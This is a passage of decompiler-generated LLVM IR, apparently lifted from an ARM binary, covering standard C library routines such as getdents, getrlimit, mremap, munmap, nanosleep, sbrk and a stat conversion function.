  br i1 %v2_16258, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_16258
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_16258, %bb
  call void @__pseudo_cond_branch(i1 %v2_16258, i32 ptrtoint (i32* @global_var_166a8.725 to i32))
  br label %dec_label_pc_16268

dec_label_pc_16268:                               ; preds = %dec_label_pc_1623c, %.thread
  %v0_16268 = load i32, i32* %r7.global-to-local, align 4
  ret i32 %v0_16268

; uselistorder directives
  uselistorder i32 %v0_16230, { 1, 2, 0, 3 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_16268, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__getdents(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %v6_1627c = load i32, i32* @r5, align 4
  %v18_1627c = load i32, i32* @sl, align 4
  store i32 141, i32* %r7.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_162b4, label %dec_label_pc_16298

dec_label_pc_16298:                               ; preds = %entry
  %v1_1629c = sub i32 0, %arg1
  %v3_162a0 = load i16, i16* @global_var_23424.488, align 2
  %v4_162a0 = sext i16 %v3_162a0 to i32
  store i32 %v4_162a0, i32* %r3.global-to-local, align 4
  %v0_162a4 = call i32 @__aeabi_read_tp()
  store i32 -1, i32* @r5, align 4
  %v3_162ac = add i32 %v4_162a0, %v0_162a4
  %v4_162ac = inttoptr i32 %v3_162ac to i32*
  store i32 %v1_1629c, i32* %v4_162ac, align 4
  br label %dec_label_pc_16308

dec_label_pc_162b4:                               ; preds = %entry
  br i1 false, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_162b4
  store i32 %arg2, i32* %r7.global-to-local, align 4
  %v3_162bc = add i32 %arg2, %arg1
  store i32 %v3_162bc, i32* @sl, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_162b4, %bb
  %v1_162f84 = phi i32 [ %v18_1627c, %dec_label_pc_162b4 ], [ %v3_162bc, %bb ]
  %v0_162f42 = phi i32 [ 141, %dec_label_pc_162b4 ], [ %arg2, %bb ]
  br i1 false, label %dec_label_pc_16308, label %dec_label_pc_162f4

dec_label_pc_162c8:                               ; preds = %dec_label_pc_162f4
  %v1_162fc = inttoptr i32 %v1_162f4 to i8*
  %v1_162c8 = add i32 %v0_162c8, 8
  %v2_162c8 = inttoptr i32 %v1_162c8 to i16*
  %v3_162c8 = load i16, i16* %v2_162c8, align 2
  %v4_162c8 = zext i16 %v3_162c8 to i32
  %v2_162cc = add i32 %v4_162c8, %v0_162c8
  store i32 %v2_162cc, i32* @r3, align 4
  %v1_162d0 = add i32 %v2_162cc, -1
  %v2_162d0 = inttoptr i32 %v1_162d0 to i8*
  %v3_162d0 = load i8, i8* %v2_162d0, align 1
  %v4_162d0 = zext i8 %v3_162d0 to i32
  store i32 %v4_162d0, i32* @r4, align 4
  %v3_162d4 = call i32 @strlen(i8* %v1_162fc)
  %v0_162d8 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_162d8, i32* @r1, align 4
  %v1_162dc = add i32 %v3_162d4, 1
  store i32 %v1_162dc, i32* @r2, align 4
  %v0_162e0 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_162e0, i32* @r0, align 4
  %v3_162e4 = call i32 @memmove(i32 %v0_162e0, i32 %v0_162d8, i32 %v1_162dc)
  %v0_162e8 = load i32, i32* %r7.global-to-local, align 4
  %v1_162e8 = add i32 %v0_162e8, 8
  %v2_162e8 = inttoptr i32 %v1_162e8 to i16*
  %v3_162e8 = load i16, i16* %v2_162e8, align 2
  %v4_162e8 = zext i16 %v3_162e8 to i32
  store i32 %v4_162e8, i32* %r3.global-to-local, align 4
  %v0_162ec = load i32, i32* @r4, align 4
  %v1_162ec = trunc i32 %v0_162ec to i8
  %v3_162ec = add i32 %v0_162e8, 10
  %v4_162ec = inttoptr i32 %v3_162ec to i8*
  store i8 %v1_162ec, i8* %v4_162ec, align 1
  %v0_162f0 = load i32, i32* %r7.global-to-local, align 4
  %v1_162f0 = load i32, i32* %r3.global-to-local, align 4
  %v2_162f0 = add i32 %v1_162f0, %v0_162f0
  store i32 %v2_162f0, i32* %r7.global-to-local, align 4
  %v1_162f8.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_162f4

dec_label_pc_162f4:                               ; preds = %.thread, %dec_label_pc_162c8
  %v1_162f8 = phi i32 [ %v1_162f8.pre, %dec_label_pc_162c8 ], [ %v1_162f84, %.thread ]
  %v0_162c8 = phi i32 [ %v2_162f0, %dec_label_pc_162c8 ], [ %v0_162f42, %.thread ]
  %v1_162f4 = add i32 %v0_162c8, 10
  store i32 %v1_162f4, i32* %r6.global-to-local, align 4
  %v3_162f8 = icmp ult i32 %v0_162c8, %v1_162f8
  %v1_16300 = add i32 %v0_162c8, 11
  store i32 %v1_16300, i32* %r8.global-to-local, align 4
  br i1 %v3_162f8, label %dec_label_pc_162c8, label %dec_label_pc_16308

dec_label_pc_16308:                               ; preds = %dec_label_pc_162f4, %.thread, %dec_label_pc_16298
  %v0_16308 = load i32, i32* @r5, align 4
  store i32 %v6_1627c, i32* @r5, align 4
  store i32 %v18_1627c, i32* @sl, align 4
  ret i32 %v0_16308

; uselistorder directives
  uselistorder i32 %v1_162f4, { 1, 0 }
  uselistorder i32 %v0_162c8, { 2, 4, 3, 1, 0 }
  uselistorder i32 %v18_1627c, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 3, 1, 4 }
  uselistorder i32* %r6.global-to-local, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @memmove, { 5, 6, 7, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_162f4, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_16320 = ptrtoint i32* %stack_var_-16 to i32
  %v2_1632c = call i32 @getrlimit(i32 7, i32 %v2_16320)
  %v1_16330 = icmp slt i32 %v2_1632c, 0
  %v5_16334 = load i32, i32* %stack_var_-16, align 4
  %storemerge = select i1 %v1_16330, i32 256, i32 %v5_16334
  ret i32 %storemerge
}

define i32 @getegid() local_unnamed_addr {
entry:
  %v1_16358 = load i32, i32* @r0, align 4
  ret i32 %v1_16358
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %v1_1636c = load i32, i32* @r0, align 4
  ret i32 %v1_1636c
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %v1_16380 = load i32, i32* @r0, align 4
  ret i32 %v1_16380
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v4_16390 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 148) to i32*), align 4
  %v1_16394 = inttoptr i32 %v4_16390 to i32*
  %v2_16394 = load i32, i32* %v1_16394, align 4
  %v2_16398 = icmp eq i32 %v2_16394, 0
  br i1 %v2_16398, label %bb, label %bb2

bb:                                               ; preds = %entry
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v1_163a0 = phi i32 [ %v2_16394, %entry ], [ 4096, %bb ]
  ret i32 %v1_163a0

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_163d8, label %dec_label_pc_163c0

dec_label_pc_163c0:                               ; preds = %entry
  %v1_163c4 = sub i32 0, %arg1
  %v3_163c8 = load i16, i16* @global_var_23424.488, align 2
  %v4_163c8 = sext i16 %v3_163c8 to i32
  %v0_163cc = call i32 @__aeabi_read_tp()
  %v3_163d0 = add i32 %v4_163c8, %v0_163cc
  %v4_163d0 = inttoptr i32 %v3_163d0 to i32*
  store i32 %v1_163c4, i32* %v4_163d0, align 4
  br label %dec_label_pc_163d8

dec_label_pc_163d8:                               ; preds = %entry, %dec_label_pc_163c0
  %v1_163dc = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_163c0 ]
  ret i32 %v1_163dc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_163d8, { 1, 0 }
}

define i32 @gettimeofday(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_163e4 = load i32, i32* @r7, align 4
  store i32 %v3_163e4, i32* %stack_var_-8, align 4
  %v0_163f0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_163f0, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_163f0, -4095
  br i1 %tmp, label %dec_label_pc_16418, label %dec_label_pc_16400

dec_label_pc_16400:                               ; preds = %entry
  %v0_16404 = call i32 @__aeabi_read_tp()
  %v3_16408 = load i16, i16* @global_var_23424.488, align 2
  %v4_16408 = sext i16 %v3_16408 to i32
  store i32 %v4_16408, i32* @r3, align 4
  %v0_1640c = load i32, i32* %r2.global-to-local, align 4
  %v1_1640c = sub i32 0, %v0_1640c
  store i32 %v1_1640c, i32* %r2.global-to-local, align 4
  %v3_16410 = add i32 %v4_16408, %v0_16404
  %v4_16410 = inttoptr i32 %v3_16410 to i32*
  store i32 %v1_1640c, i32* %v4_16410, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_16418.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_16418

dec_label_pc_16418:                               ; preds = %entry, %dec_label_pc_16400
  %v1_1641c = phi i32 [ %v0_163f0, %entry ], [ -1, %dec_label_pc_16400 ]
  %v2_16418 = phi i32 [ %v3_163e4, %entry ], [ %v2_16418.pre, %dec_label_pc_16400 ]
  store i32 %v2_16418, i32* @r7, align 4
  ret i32 %v1_1641c

; uselistorder directives
  uselistorder i32 %v0_163f0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16418, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %v1_16434 = load i32, i32* @r0, align 4
  ret i32 %v1_16434
}

define i32 @mremap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_16438 = load i32, i32* @r4, align 4
  store i32 %v3_16438, i32* %stack_var_-12, align 4
  %v0_16448 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16448, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_16448, -4095
  br i1 %tmp, label %dec_label_pc_16470, label %dec_label_pc_16458

dec_label_pc_16458:                               ; preds = %entry
  %v0_1645c = call i32 @__aeabi_read_tp()
  %v3_16460 = load i16, i16* @global_var_23424.488, align 2
  %v4_16460 = sext i16 %v3_16460 to i32
  %v0_16464 = load i32, i32* %r2.global-to-local, align 4
  %v1_16464 = sub i32 0, %v0_16464
  store i32 %v1_16464, i32* %r2.global-to-local, align 4
  %v3_16468 = add i32 %v4_16460, %v0_1645c
  %v4_16468 = inttoptr i32 %v3_16468 to i32*
  store i32 %v1_16464, i32* %v4_16468, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_16470.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_16470

dec_label_pc_16470:                               ; preds = %entry, %dec_label_pc_16458
  %v1_16474 = phi i32 [ %v0_16448, %entry ], [ -1, %dec_label_pc_16458 ]
  %v2_16470 = phi i32 [ %v3_16438, %entry ], [ %v2_16470.pre, %dec_label_pc_16458 ]
  store i32 %v2_16470, i32* @r4, align 4
  ret i32 %v1_16474

; uselistorder directives
  uselistorder i32 %v0_16448, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16470, { 1, 0 }
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1647c = load i32, i32* @r7, align 4
  store i32 %v3_1647c, i32* %stack_var_-8, align 4
  %v0_16488 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16488, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_16488, -4095
  br i1 %tmp, label %dec_label_pc_164b0, label %dec_label_pc_16498

dec_label_pc_16498:                               ; preds = %entry
  %v0_1649c = call i32 @__aeabi_read_tp()
  %v3_164a0 = load i16, i16* @global_var_23424.488, align 2
  %v4_164a0 = sext i16 %v3_164a0 to i32
  %v0_164a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_164a4 = sub i32 0, %v0_164a4
  store i32 %v1_164a4, i32* %r2.global-to-local, align 4
  %v3_164a8 = add i32 %v4_164a0, %v0_1649c
  %v4_164a8 = inttoptr i32 %v3_164a8 to i32*
  store i32 %v1_164a4, i32* %v4_164a8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_164b0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_164b0

dec_label_pc_164b0:                               ; preds = %entry, %dec_label_pc_16498
  %v1_164b4 = phi i32 [ %v0_16488, %entry ], [ -1, %dec_label_pc_16498 ]
  %v2_164b0 = phi i32 [ %v3_1647c, %entry ], [ %v2_164b0.pre, %dec_label_pc_16498 ]
  store i32 %v2_164b0, i32* @r7, align 4
  ret i32 %v1_164b4

; uselistorder directives
  uselistorder i32 %v0_16488, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_164b0, { 1, 0 }
}

define i32 @__syscall_nanosleep() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_164bc = load i32, i32* @r7, align 4
  store i32 %v3_164bc, i32* %stack_var_-8, align 4
  %v0_164c8 = load i32, i32* @r0, align 4
  store i32 %v0_164c8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_164c8, -4095
  br i1 %tmp, label %dec_label_pc_164f0, label %dec_label_pc_164d8

dec_label_pc_164d8:                               ; preds = %entry
  %v0_164dc = call i32 @__aeabi_read_tp()
  %v3_164e0 = load i16, i16* @global_var_23424.488, align 2
  %v4_164e0 = sext i16 %v3_164e0 to i32
  %v0_164e4 = load i32, i32* %r2.global-to-local, align 4
  %v1_164e4 = sub i32 0, %v0_164e4
  store i32 %v1_164e4, i32* %r2.global-to-local, align 4
  %v3_164e8 = add i32 %v4_164e0, %v0_164dc
  %v4_164e8 = inttoptr i32 %v3_164e8 to i32*
  store i32 %v1_164e4, i32* %v4_164e8, align 4
  %v2_164f0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_164f0

dec_label_pc_164f0:                               ; preds = %entry, %dec_label_pc_164d8
  %v1_164f4 = phi i32 [ %v0_164c8, %entry ], [ -1, %dec_label_pc_164d8 ]
  %v2_164f0 = phi i32 [ %v3_164bc, %entry ], [ %v2_164f0.pre, %dec_label_pc_164d8 ]
  store i32 %v2_164f0, i32* @r7, align 4
  ret i32 %v1_164f4

; uselistorder directives
  uselistorder i32 %v0_164c8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_164f0, { 1, 0 }
}

define i32 @__libc_nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v4_16508 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 13032) to i32*), align 4
  %v2_1650c = icmp eq i32 %v4_16508, 0
  %v3_16510 = load i32, i32* @r4, align 4
  %v9_16510 = load i32, i32* @r6, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_1650c, label %dec_label_pc_16520, label %entry.dec_label_pc_16528_crit_edge

entry.dec_label_pc_16528_crit_edge:               ; preds = %entry
  br label %dec_label_pc_16528

dec_label_pc_16520:                               ; preds = %entry
  store i32 %v3_16510, i32* @r4, align 4
  store i32 %v9_16510, i32* @r6, align 4
  %v0_16524 = call i32 @__syscall_nanosleep()
  br label %dec_label_pc_16528

dec_label_pc_16528:                               ; preds = %entry.dec_label_pc_16528_crit_edge, %dec_label_pc_16520
  %v0_16528 = call i32 @__libc_enable_asynccancel()
  %v0_1652c = load i32, i32* @r6, align 4
  store i32 %v0_1652c, i32* @r1, align 4
  store i32 %v0_16528, i32* @r5, align 4
  %v0_16534 = load i32, i32* @r4, align 4
  store i32 %v0_16534, i32* @r0, align 4
  %v0_16538 = call i32 @__syscall_nanosleep()
  store i32 %v0_16538, i32* @r4, align 4
  %v0_16540 = load i32, i32* @r5, align 4
  %v1_16544 = call i32 @__libc_disable_asynccancel(i32 %v0_16540)
  %v0_16548 = load i32, i32* @r4, align 4
  ret i32 %v0_16548

; uselistorder directives
  uselistorder i32 (i32)* @__libc_disable_asynccancel, { 7, 10, 13, 1, 6, 8, 5, 9, 4, 3, 12, 2, 11, 0 }
  uselistorder i32 ()* @__libc_enable_asynccancel, { 7, 10, 13, 1, 6, 8, 5, 9, 4, 3, 12, 2, 11, 0 }
  uselistorder label %dec_label_pc_16528, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1655c = load i32, i32* @r4, align 4
  store i32 %v3_1655c, i32* %stack_var_-16, align 4
  store i32 11580, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32* %r4.global-to-local, align 4
  %v4_1656c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 11580) to i32*), align 4
  %v2_16570 = icmp eq i32 %v4_1656c, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_16570, label %dec_label_pc_1657c, label %dec_label_pc_1658c

dec_label_pc_1657c:                               ; preds = %entry
  %v1_16580 = call i32 @__GI_brk(i32 0)
  %v1_16584 = icmp slt i32 %v1_16580, 0
  br i1 %v1_16584, label %dec_label_pc_165b0, label %dec_label_pc_1658cthread-pre-split

dec_label_pc_1658cthread-pre-split:               ; preds = %dec_label_pc_1657c
  %v0_16590.pr = load i32, i32* %r5.global-to-local, align 4
  %v0_1658c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1658c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1658c

dec_label_pc_1658c:                               ; preds = %dec_label_pc_1658cthread-pre-split, %entry
  %v1_1658c = phi i32 [ %v1_1658c.pre, %dec_label_pc_1658cthread-pre-split ], [ 11580, %entry ]
  %v0_1658c = phi i32 [ %v0_1658c.pre, %dec_label_pc_1658cthread-pre-split ], [ ptrtoint (i32* @global_var_233cc.493 to i32), %entry ]
  %v1_165a0 = phi i32 [ %v0_16590.pr, %dec_label_pc_1658cthread-pre-split ], [ %arg1, %entry ]
  %v2_1658c = add i32 %v0_1658c, %v1_1658c
  %v3_1658c = inttoptr i32 %v2_1658c to i32*
  %v4_1658c = load i32, i32* %v3_1658c, align 4
  %v2_16590 = icmp eq i32 %v1_165a0, 0
  store i32 %v4_1658c, i32* %r4.global-to-local, align 4
  br i1 %v2_16590, label %dec_label_pc_165b4, label %dec_label_pc_1659c

dec_label_pc_1659c:                               ; preds = %dec_label_pc_1658c
  %v2_165a0 = add i32 %v4_1658c, %v1_165a0
  %v1_165a4 = call i32 @__GI_brk(i32 %v2_165a0)
  %v1_165a8 = icmp slt i32 %v1_165a4, 0
  br i1 %v1_165a8, label %dec_label_pc_165b0, label %dec_label_pc_1659c.dec_label_pc_165b4_crit_edge

dec_label_pc_1659c.dec_label_pc_165b4_crit_edge:  ; preds = %dec_label_pc_1659c
  %v0_165b4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_165b4

dec_label_pc_165b0:                               ; preds = %dec_label_pc_1659c, %dec_label_pc_1657c
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_165b4

dec_label_pc_165b4:                               ; preds = %dec_label_pc_1658c, %dec_label_pc_1659c.dec_label_pc_165b4_crit_edge, %dec_label_pc_165b0
  %v0_165b4 = phi i32 [ %v0_165b4.pre, %dec_label_pc_1659c.dec_label_pc_165b4_crit_edge ], [ -1, %dec_label_pc_165b0 ], [ %v4_1658c, %dec_label_pc_1658c ]
  %v2_165b8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_165b8, i32* @r4, align 4
  ret i32 %v0_165b4

; uselistorder directives
  uselistorder i32 %v4_1658c, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_165b4, { 2, 1, 0 }
}

define i32 @times(i32 %arg1) local_unnamed_addr {
entry:
  %v1_165d8 = load i32, i32* @r0, align 4
  ret i32 %v1_165d8
}

define i32 @__xstat64_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_165dc = load i32, i32* @r4, align 4
  store i32 %v3_165dc, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 104, i32* %r2.global-to-local, align 4
  %v3_165f4 = inttoptr i32 %arg2 to i8*
  %v4_165f4 = call i32 @__GI_memset(i8* %v3_165f4, i32 0, i32 104)
  %v2_165f8 = load i32, i32* %arg1, align 4
  store i32 %v2_165f8, i32* %r3.global-to-local, align 4
  %v3_165f8 = add i32 %tmp, 4
  %v4_165f8 = inttoptr i32 %v3_165f8 to i32*
  %v5_165f8 = load i32, i32* %v4_165f8, align 4
  store i32 %v5_165f8, i32* %r4.global-to-local, align 4
  %v0_165fc = load i32, i32* %r5.global-to-local, align 4
  %v1_165fc = inttoptr i32 %v0_165fc to i32*
  store i32 %v2_165f8, i32* %v1_165fc, align 4
  %v3_165fc = add i32 %v0_165fc, 4
  %v4_165fc = inttoptr i32 %v3_165fc to i32*
  %v5_165fc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_165fc, i32* %v4_165fc, align 4
  %v0_16600 = load i32, i32* %r6.global-to-local, align 4
  %v1_16600 = add i32 %v0_16600, 12
  %v2_16600 = inttoptr i32 %v1_16600 to i32*
  %v3_16600 = load i32, i32* %v2_16600, align 4
  %v1_16604 = load i32, i32* %r5.global-to-local, align 4
  %v2_16604 = add i32 %v1_16604, 12
  %v3_16604 = inttoptr i32 %v2_16604 to i32*
  store i32 %v3_16600, i32* %v3_16604, align 4
  %v0_16608 = load i32, i32* %r6.global-to-local, align 4
  %v1_16608 = add i32 %v0_16608, 96
  store i32 %v1_16608, i32* %r3.global-to-local, align 4
  %v1_1660c = inttoptr i32 %v1_16608 to i32*
  %v2_1660c = load i32, i32* %v1_1660c, align 4
  store i32 %v2_1660c, i32* %r3.global-to-local, align 4
  %v3_1660c = add i32 %v0_16608, 100
  %v4_1660c = inttoptr i32 %v3_1660c to i32*
  %v5_1660c = load i32, i32* %v4_1660c, align 4
  store i32 %v5_1660c, i32* %r4.global-to-local, align 4
  %v1_16610 = add i32 %v0_16608, 56
  %v2_16610 = inttoptr i32 %v1_16610 to i32*
  %v3_16610 = load i32, i32* %v2_16610, align 4
  store i32 %v3_16610, i32* %r2.global-to-local, align 4
  %v1_16614 = load i32, i32* %r5.global-to-local, align 4
  %v2_16614 = add i32 %v1_16614, 96
  %v3_16614 = inttoptr i32 %v2_16614 to i32*
  store i32 %v2_1660c, i32* %v3_16614, align 4
  %v0_16618 = load i32, i32* %r4.global-to-local, align 4
  %v1_16618 = load i32, i32* %r5.global-to-local, align 4
  %v2_16618 = add i32 %v1_16618, 100
  %v3_16618 = inttoptr i32 %v2_16618 to i32*
  store i32 %v0_16618, i32* %v3_16618, align 4
  %v0_1661c = load i32, i32* %r6.global-to-local, align 4
  %v1_1661c = add i32 %v0_1661c, 24
  store i32 %v1_1661c, i32* %ip.global-to-local, align 4
  %v1_16620 = inttoptr i32 %v1_1661c to i32*
  %v2_16620 = load i32, i32* %v1_16620, align 4
  store i32 %v2_16620, i32* %ip.global-to-local, align 4
  %v3_16620 = add i32 %v0_1661c, 28
  %v4_16620 = inttoptr i32 %v3_16620 to i32*
  %v5_16620 = load i32, i32* %v4_16620, align 4
  store i32 %v5_16620, i32* %lr.global-to-local, align 4
  %v0_16624 = load i32, i32* %r2.global-to-local, align 4
  %v1_16624 = load i32, i32* %r5.global-to-local, align 4
  %v2_16624 = add i32 %v1_16624, 56
  %v3_16624 = inttoptr i32 %v2_16624 to i32*
  store i32 %v0_16624, i32* %v3_16624, align 4
  %v0_16628 = load i32, i32* %r6.global-to-local, align 4
  %v1_16628 = add i32 %v0_16628, 72
  store i32 %v1_16628, i32* %r3.global-to-local, align 4
  %v1_1662c = add i32 %v0_16628, 32
  store i32 %v1_1662c, i32* %r7.global-to-local, align 4
  %v1_16630 = inttoptr i32 %v1_1662c to i32*
  %v2_16630 = load i32, i32* %v1_16630, align 4
  store i32 %v2_16630, i32* %r7.global-to-local, align 4
  %v3_16630 = add i32 %v0_16628, 36
  %v4_16630 = inttoptr i32 %v3_16630 to i32*
  %v5_16630 = load i32, i32* %v4_16630, align 4
  store i32 %v5_16630, i32* %r8.global-to-local, align 4
  %v1_16634 = inttoptr i32 %v1_16628 to i32*
  %v2_16634 = load i32, i32* %v1_16634, align 4
  %v3_16634 = add i32 %v0_16628, 76
  %v4_16634 = inttoptr i32 %v3_16634 to i32*
  %v5_16634 = load i32, i32* %v4_16634, align 4
  store i32 %v5_16634, i32* %r1.global-to-local, align 4
  %v0_16638 = load i32, i32* %r5.global-to-local, align 4
  %v1_16638 = add i32 %v0_16638, 72
  %v1_1663c = inttoptr i32 %v1_16638 to i32*
  store i32 %v2_16634, i32* %v1_1663c, align 4
  %v3_1663c = add i32 %v0_16638, 76
  %v4_1663c = inttoptr i32 %v3_1663c to i32*
  %v5_1663c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1663c, i32* %v4_1663c, align 4
  %v0_16640 = load i32, i32* %r7.global-to-local, align 4
  %v1_16640 = load i32, i32* %r5.global-to-local, align 4
  %v2_16640 = add i32 %v1_16640, 32
  %v3_16640 = inttoptr i32 %v2_16640 to i32*
  store i32 %v0_16640, i32* %v3_16640, align 4
  %v0_16644 = load i32, i32* %r8.global-to-local, align 4
  %v1_16644 = load i32, i32* %r5.global-to-local, align 4
  %v2_16644 = add i32 %v1_16644, 36
  %v3_16644 = inttoptr i32 %v2_16644 to i32*
  store i32 %v0_16644, i32* %v3_16644, align 4
  %v0_16648 = load i32, i32* %r6.global-to-local, align 4
  %v1_16648 = add i32 %v0_16648, 80
  store i32 %v1_16648, i32* %r3.global-to-local, align 4
  %v1_1664c = add i32 %v0_16648, 48
  store i32 %v1_1664c, i32* %r7.global-to-local, align 4
  %v1_16650 = inttoptr i32 %v1_1664c to i32*
  %v2_16650 = load i32, i32* %v1_16650, align 4
  store i32 %v2_16650, i32* %r7.global-to-local, align 4
  %v3_16650 = add i32 %v0_16648, 52
  %v4_16650 = inttoptr i32 %v3_16650 to i32*
  %v5_16650 = load i32, i32* %v4_16650, align 4
  store i32 %v5_16650, i32* %r8.global-to-local, align 4
  %v1_16654 = inttoptr i32 %v1_16648 to i32*
  %v2_16654 = load i32, i32* %v1_16654, align 4
  %v3_16654 = add i32 %v0_16648, 84
  %v4_16654 = inttoptr i32 %v3_16654 to i32*
  %v5_16654 = load i32, i32* %v4_16654, align 4
  store i32 %v5_16654, i32* %r1.global-to-local, align 4
  %v1_16658 = add i32 %v0_16648, 16
  %v2_16658 = inttoptr i32 %v1_16658 to i32*
  %v3_16658 = load i32, i32* %v2_16658, align 4
  store i32 %v3_16658, i32* %r2.global-to-local, align 4
  %v0_1665c = load i32, i32* %r5.global-to-local, align 4
  %v1_1665c = add i32 %v0_1665c, 80
  %v1_16660 = inttoptr i32 %v1_1665c to i32*
  store i32 %v2_16654, i32* %v1_16660, align 4
  %v3_16660 = add i32 %v0_1665c, 84
  %v4_16660 = inttoptr i32 %v3_16660 to i32*
  %v5_16660 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_16660, i32* %v4_16660, align 4
